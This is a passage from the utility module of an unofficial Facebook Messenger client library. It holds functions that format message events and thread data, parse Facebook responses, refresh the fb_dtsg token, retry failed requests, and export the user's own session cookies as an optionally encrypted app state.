        type: "typ"
    };
}

function formatDeltaReadReceipt(delta) {
    // otherUserFbId seems to be used as both the readerID and the threadID in a 1-1 chat.
    // In a group chat actorFbId is used for the reader and threadFbId for the thread.
    return {
        reader: (delta.threadKey.otherUserFbId || delta.actorFbId).toString(),
        time: delta.actionTimestampMs,
        threadID: formatID((delta.threadKey.otherUserFbId || delta.threadKey.threadFbId).toString()),
        type: "read_receipt"
    };
}

function formatReadReceipt(event) {
    return {
        reader: event.reader.toString(),
        time: event.time,
        threadID: formatID((event.thread_fbid || event.reader).toString()),
        type: "read_receipt"
    };
}

function formatRead(event) {
    return {
        threadID: formatID(((event.chat_ids && event.chat_ids[0]) || (event.thread_fbids && event.thread_fbids[0])).toString()),
        time: event.timestamp,
        type: "read"
    };
}

function getFrom(str, startToken, endToken) {
    var start = str.indexOf(startToken) + startToken.length;
    if (start < startToken.length) return "";

    var lastHalf = str.substring(start);
    var end = lastHalf.indexOf(endToken);
    if (end === -1) throw Error("Could not find endTime `" + endToken + "` in the given string.");
    return lastHalf.substring(0, end);
}

function makeParsable(html) {
    let withoutForLoop = html.replace(/for\s*\(\s*;\s*;\s*\)\s*;\s*/, "");

    // (What the fuck FB, why windows style newlines?)
    // So sometimes FB will send us base multiple objects in the same response.
    // They're all valid JSON, one after the other, at the top level. We detect
    // that and make it parse-able by JSON.parse.
    //       Ben - July 15th 2017
    //
    // It turns out that Facebook may insert random number of spaces before
    // next object begins (issue #616)
    //       rav_kr - 2018-03-19
    let maybeMultipleObjects = withoutForLoop.split(/\}\r\n *\{/);
    if (maybeMultipleObjects.length === 1) return maybeMultipleObjects;

    return "[" + maybeMultipleObjects.join("},{") + "]";
}

function arrToForm(form) {
    return arrayToObject(form,
        function(v) {
            return v.name;
        },
        function(v) {
            return v.val;
        }
    );
}

function arrayToObject(arr, getKey, getValue) {
    return arr.reduce(function(acc, val) {
        acc[getKey(val)] = getValue(val);
        return acc;
    }, {});
}

function getSignatureID() {
    return Math.floor(Math.random() * 2147483648).toString(16);
}

function generateTimestampRelative() {
    var d = new Date();
    return d.getHours() + ":" + padZeros(d.getMinutes());
}

function makeDefaults(html, userID, ctx) {
    var reqCounter = 1;
    var fb_dtsg = getFrom(html, 'name="fb_dtsg" value="', '"');

    // @Hack Ok we've done hacky things, this is definitely on top 5.
    // We totally assume the object is flat and try parsing until a }.
    // If it works though it's cool because we get a bunch of extra data things.
    //
    // Update: we don't need this. Leaving it in in case we ever do.
    //       Ben - July 15th 2017

    // var siteData = getFrom(html, "[\"SiteData\",[],", "},");
    // try {
    //   siteData = JSON.parse(siteData + "}");
    // } catch(e) {
    //   log.warn("makeDefaults", "Couldn't parse SiteData. Won't have access to some variables.");
    //   siteData = {};
    // }

    var ttstamp = "2";
    for (var i = 0; i < fb_dtsg.length; i++) ttstamp += fb_dtsg.charCodeAt(i);
    var revision = getFrom(html, 'revision":', ",");

    function mergeWithDefaults(obj) {
        // @TODO This is missing a key called __dyn.
        // After some investigation it seems like __dyn is some sort of set that FB
        // calls BitMap. It seems like certain responses have a "define" key in the
        // res.jsmods arrays. I think the code iterates over those and calls `set`
        // on the bitmap for each of those keys. Then it calls
        // bitmap.toCompressedString() which returns what __dyn is.
        //
        // So far the API has been working without this.
        //
        //              Ben - July 15th 2017
        var newObj = {
            __user: userID,
            __req: (reqCounter++).toString(36),
            __rev: revision,
            __a: 1,
            // __af: siteData.features,
            fb_dtsg: ctx.fb_dtsg ? ctx.fb_dtsg : fb_dtsg,
            jazoest: ctx.ttstamp ? ctx.ttstamp : ttstamp
                // __spin_r: siteData.__spin_r,
                // __spin_b: siteData.__spin_b,
                // __spin_t: siteData.__spin_t,
        };

        // @TODO this is probably not needed.
        //         Ben - July 15th 2017
        // if (siteData.be_key) {
        //   newObj[siteData.be_key] = siteData.be_mode;
        // }
        // if (siteData.pkg_cohort_key) {
        //   newObj[siteData.pkg_cohort_key] = siteData.pkg_cohort;
        // }

        if (!obj) return newObj;
        for (var prop in obj)
            if (obj.hasOwnProperty(prop))
                if (!newObj[prop]) newObj[prop] = obj[prop];
        return newObj;
    }

    function postWithDefaults(url, jar, form, ctxx) {
        return post(url, jar, mergeWithDefaults(form), ctx.globalOptions, ctxx || ctx);
    }

    function getWithDefaults(url, jar, qs, ctxx) {
        return get(url, jar, mergeWithDefaults(qs), ctx.globalOptions, ctxx || ctx);
    }

    function postFormDataWithDefault(url, jar, form, qs, ctxx) {
        return postFormData(url, jar, mergeWithDefaults(form), mergeWithDefaults(qs), ctx.globalOptions, ctxx || ctx);
    }

    return {
        get: getWithDefaults,
        post: postWithDefaults,
        postFormData: postFormDataWithDefault
    };
}

function parseAndCheckLogin(ctx, defaultFuncs, retryCount) {
    if (retryCount == undefined) retryCount = 0;
    return function(data) {
        return bluebird.try(function() {
            log.verbose("parseAndCheckLogin", data.body);
            if (data.statusCode >= 500 && data.statusCode < 600) {
                if (retryCount >= 5) {
                    throw {
                        error: "Request retry failed. Check the `res` and `statusCode` property on this error.",
                        statusCode: data.statusCode,
                        res: data.body
                    };
                }
                retryCount++;
                var retryTime = Math.floor(Math.random() * 5000);
                log.warn("parseAndCheckLogin", "Got status code " + data.statusCode + " - " + retryCount + ". attempt to retry in " + retryTime + " milliseconds...");
                var url = data.request.uri.protocol + "//" + data.request.uri.hostname + data.request.uri.pathname;
                if (data.request.headers["Content-Type"].split(";")[0] === "multipart/form-data") {
                    return bluebird.delay(retryTime).then(() => defaultFuncs.postFormData(url, ctx.jar, data.request.formData, {}))
                        .then(parseAndCheckLogin(ctx, defaultFuncs, retryCount));
                } else {
                    return bluebird.delay(retryTime).then(() => defaultFuncs.post(url, ctx.jar, data.request.formData))
                        .then(parseAndCheckLogin(ctx, defaultFuncs, retryCount));
                }
            }
            if (data.statusCode !== 200) throw new Error("parseAndCheckLogin got status code: " + data.statusCode + ". Bailing out of trying to parse response.");

            var res = null;
            try {
                res = JSON.parse(makeParsable(data.body));
            } catch (e) {
                throw {
                    error: "JSON.parse error. Check the `detail` property on this error.",
                    detail: e,
                    res: data.body
                };
            }

            // In some cases the response contains only a redirect URL which should be followed
            if (res.redirect && data.request.method === "GET") return defaultFuncs.get(res.redirect, ctx.jar).then(parseAndCheckLogin(ctx, defaultFuncs));

            // TODO: handle multiple cookies?
            if (res.jsmods && res.jsmods.require && Array.isArray(res.jsmods.require[0]) && res.jsmods.require[0][0] === "Cookie") {
                res.jsmods.require[0][3][0] = res.jsmods.require[0][3][0].replace("_js_", "");
                var cookie = formatCookie(res.jsmods.require[0][3], "facebook");
                var cookie2 = formatCookie(res.jsmods.require[0][3], "messenger");
                ctx.jar.setCookieSync(cookie, "https://www.facebook.com");
                ctx.jar.setCookieSync(cookie2, "https://www.messenger.com");
            }

            // On every request we check if we got a DTSG and we mutate the context so that we use the latest
            // one for the next requests.
            if (res.jsmods && Array.isArray(res.jsmods.require)) {
                var arr = res.jsmods.require;
                for (var i in arr) {
                    if (arr[i][0] === "DTSG" && arr[i][1] === "setToken") {
                        ctx.fb_dtsg = arr[i][3][0];

                        // Update ttstamp since that depends on fb_dtsg
                        ctx.ttstamp = "2";
                        for (var j = 0; j < ctx.fb_dtsg.length; j++) ctx.ttstamp += ctx.fb_dtsg.charCodeAt(j);
                    }
                }
            }

            if (res.error === 1357001) throw { error: "Chưa Đăng Nhập Được - Appstate Đã Bị Lỗi" };
            return res;
        });
    };
}

function saveCookies(jar) {
    return function(res) {
        var cookies = res.headers["set-cookie"] || [];
        cookies.forEach(function(c) {
            if (c.includes("domain=.facebook.com;")) { // yo wtf is this?
                jar.setCookieSync(c, "https://www.facebook.com");
                jar.setCookieSync(c.replace(/domain=\.facebook\.com/, "domain=.messenger.com"), "https://www.messenger.com");
            }
        });
        return res;
    };
}

var NUM_TO_MONTH = [
    "Jan",
    "Feb",
    "Mar",
    "Apr",
    "May",
    "Jun",
    "Jul",
    "Aug",
    "Sep",
    "Oct",
    "Nov",
    "Dec"
];
var NUM_TO_DAY = ["Sun", "Mon", "Tue", "Wed", "Thu", "Fri", "Sat"];

function formatDate(date) {
    var d = date.getUTCDate();
    d = d >= 10 ? d : "0" + d;
    var h = date.getUTCHours();
    h = h >= 10 ? h : "0" + h;
    var m = date.getUTCMinutes();
    m = m >= 10 ? m : "0" + m;
    var s = date.getUTCSeconds();
    s = s >= 10 ? s : "0" + s;
    return (NUM_TO_DAY[date.getUTCDay()] + ", " + d + " " + NUM_TO_MONTH[date.getUTCMonth()] + " " + date.getUTCFullYear() + " " + h + ":" + m + ":" + s + " GMT");
}

function formatCookie(arr, url) {
    return arr[0] + "=" + arr[1] + "; Path=" + arr[3] + "; Domain=" + url + ".com";
}

function formatThread(data) {
    return {
        threadID: formatID(data.thread_fbid.toString()),
        participants: data.participants.map(formatID),
        participantIDs: data.participants.map(formatID),
        name: data.name,
        nicknames: data.custom_nickname,
        snippet: data.snippet,
        snippetAttachments: data.snippet_attachments,
        snippetSender: formatID((data.snippet_sender || "").toString()),
        unreadCount: data.unread_count,
        messageCount: data.message_count,
        imageSrc: data.image_src,
        timestamp: data.timestamp,
        muteUntil: data.mute_until,
        isCanonicalUser: data.is_canonical_user,
        isCanonical: data.is_canonical,
        isSubscribed: data.is_subscribed,
        folder: data.folder,
        isArchived: data.is_archived,
        recipientsLoadable: data.recipients_loadable,
        hasEmailParticipant: data.has_email_participant,
        readOnly: data.read_only,
        canReply: data.can_reply,
        cannotReplyReason: data.cannot_reply_reason,
        lastMessageTimestamp: data.last_message_timestamp,
        lastReadTimestamp: data.last_read_timestamp,
        lastMessageType: data.last_message_type,
        emoji: data.custom_like_icon,
        color: data.custom_color,
        adminIDs: data.admin_ids,
        threadType: data.thread_type
    };
}

function getType(obj) {
    return Object.prototype.toString.call(obj).slice(8, -1);
}

function formatProxyPresence(presence, userID) {
    if (presence.lat === undefined || presence.p === undefined) return null;
    return {
        type: "presence",
        timestamp: presence.lat * 1000,
        userID: userID || '',
        statuses: presence.p
    };
}

function formatPresence(presence, userID) {
    return {
        type: "presence",
        timestamp: presence.la * 1000,
        userID: userID || '',
        statuses: presence.a
    };
}

function decodeClientPayload(payload) {
    /*
    Special function which Client using to "encode" clients JSON payload
    */
    function Utf8ArrayToStr(array) {
        var out, i, len, c;
        var char2, char3;
        out = "";
        len = array.length;
        i = 0;
        while (i < len) {
            c = array[i++];
            switch (c >> 4) {
                case 0:
                case 1:
                case 2:
                case 3:
                case 4:
                case 5:
                case 6:
                case 7:
                    out += String.fromCharCode(c);
                    break;
                case 12:
                case 13:
                    char2 = array[i++];
                    out += String.fromCharCode(((c & 0x1F) << 6) | (char2 & 0x3F));
                    break;
                case 14:
                    char2 = array[i++]; 
                    char3 = array[i++];
                    out += String.fromCharCode(((c & 0x0F) << 12) | ((char2 & 0x3F) << 6) | ((char3 & 0x3F) << 0));
                    break;
            }
        }
        return out;
    }
    return JSON.parse(Utf8ArrayToStr(payload));
}

function getAppState(jar) {
    var prettyMilliseconds = require('pretty-ms')
    var getText = global.Fca.getText;
    var StateCrypt = require('./StateCrypt');
    var appstate = jar.getCookiesSync("https://www.facebook.com").concat(jar.getCookiesSync("https://facebook.com")).concat(jar.getCookiesSync("https://www.messenger.com"))
    var logger = require('./logger'),languageFile = require('./Language/index.json');
    var Language = languageFile.find(i => i.Language == global.Fca.Require.FastConfig.Language).Folder.Index;
    var data;
        switch (require("../../FastConfigFca.json").EncryptFeature) {
            case true: {
                if (process.env['FBKEY'] != undefined) {
                    logger(Language.EncryptSuccess,'[ FCA-HZI ]');
                    data = StateCrypt.encryptState(JSON.stringify(appstate),process.env['FBKEY']);
                }
                else return appstate;
            }
                break;
            case false: {
                data = appstate;
            }
                break;
            default: {
                logger(getText(Language.IsNotABoolean,require("../../FastConfigFca.json").EncryptFeature));
                data = appstate;
            } 
        }
    logger(getText(Language.ProcessDone,`${prettyMilliseconds(Date.now() - global.Fca.startTime)}`), "[ FCA-HZI ]");
return data;
}

module.exports = {
    isReadableStream:isReadableStream,
    get:get,
    post:post,
    postFormData:postFormData,
    generateThreadingID:generateThreadingID,
    generateOfflineThreadingID:generateOfflineThreadingID,
    getGUID:getGUID,
    getFrom:getFrom,
    makeParsable:makeParsable,
    arrToForm:arrToForm,
    getSignatureID:getSignatureID,
    getJar: cookiejar,
    generateTimestampRelative:generateTimestampRelative,
    makeDefaults:makeDefaults,
    parseAndCheckLogin:parseAndCheckLogin,
    getGender: getGenderByPhysicalMethod,
    saveCookies,
    getType,
    _formatAttachment,
    formatHistoryMessage,
    formatID,
    formatMessage,
    formatDeltaEvent,
    formatDeltaMessage,
    formatProxyPresence,
    formatPresence,
    formatTyp,
    formatDeltaReadReceipt,
    formatCookie,
    formatThread,
    formatReadReceipt,
    formatRead,
    generatePresence,
    generateAccessiblityCookie,
    formatDate,
    decodeClientPayload,
    getAppState,
    getAdminTextMessageType,
    setProxy
};